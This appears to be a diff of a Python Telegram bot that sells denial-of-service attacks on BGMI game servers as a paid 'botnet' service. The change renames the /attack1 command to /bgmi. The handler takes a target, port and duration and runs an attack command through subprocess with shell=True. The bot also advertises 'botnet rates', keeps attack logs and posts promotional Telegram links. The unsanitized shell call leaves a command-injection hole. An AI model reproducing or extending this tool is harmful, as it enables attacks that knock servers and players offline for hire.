@@ -209,12 +209,12 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, \n✨✨Premium \nAttack1 STARTED 🚀 BY HELLA.\n\n📡 𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n🔌 𝐏𝐨𝐫𝐭: {port}\n⏱️ 𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝐌𝐞𝐭𝐡𝐨𝐝: Premium \nBy https://t.me/+UeyuOvW5BQg5NzI1"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /attack1 command
+# Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
 
 
-# Handler for /attack1 command
+# Handler for /bgmi command
 
 @bot.message_handler(commands=['attack1'])
 def handle_bgmi(message):
@@ -226,7 +226,7 @@ def handle_bgmi(message):
                 time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                 if time_since_last_attack < 300:
                     remaining_time = 300 - time_since_last_attack
-                    response = f"You are on cooldown. Please wait {remaining_time} seconds before running the /attack1 command again."
+                    response = f"You are on cooldown. Please wait {remaining_time} seconds before running the /bgmi command again."
                     bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -247,7 +247,7 @@ def handle_bgmi(message):
                 subprocess.run(full_command, shell=True)
                 response = f"RAGNAROK 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/+UeyuOvW5BQg5NzI1"
         else:
-            response = "Usage :- /attack1 <target> <port> <time>\nBy @GoDxPawanproYT"  # Updated command syntax
+            response = "🪀Usage :- /bgmi <target> <port> <time>\nBy @GoDxPawanproYT"  # Updated command syntax
     else:
         response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @GoDxPawanproYT"
 
@@ -279,7 +279,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text = '''Available commands:
- /attack1 : Method For Bgmi Servers. 
+ /bgmi : Method For Bgmi Servers. 
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
